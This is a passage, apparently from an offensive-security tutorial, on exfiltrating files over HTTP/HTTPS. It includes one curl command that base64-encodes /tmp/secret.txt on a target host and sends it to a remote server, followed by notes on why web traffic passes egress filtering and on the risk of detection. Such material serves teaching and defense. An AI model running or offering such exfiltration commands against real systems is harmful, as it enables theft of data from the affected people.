# Data encoded in GET request (less common for large files)
user@target:~$ curl "http://192.168.1.100:8000/data?payload=$(base64 /tmp/secret.txt)"

Why HTTP/HTTPS?

  • Commonly Allowed: Egress filtering often permits outbound web traffic.
  • Standard Tools: `curl`, `wget`, `Invoke-WebRequest` are widely available.
  • Versatile: Can use POST for file uploads or GET for encoded data.

Considerations

  • Detection Risk: Large file transfers or unusual GET requests can trigger alerts.
  • Encryption: HTTPS encrypts data in transit, HTTP sends in cleartext.
  • Server Setup: Requires an attacker-controlled web server to receive data.
Key Takeaway

HTTP/HTTPS are often the easiest exfiltration routes due to common firewall rules, but always consider the risk of detection and data security.
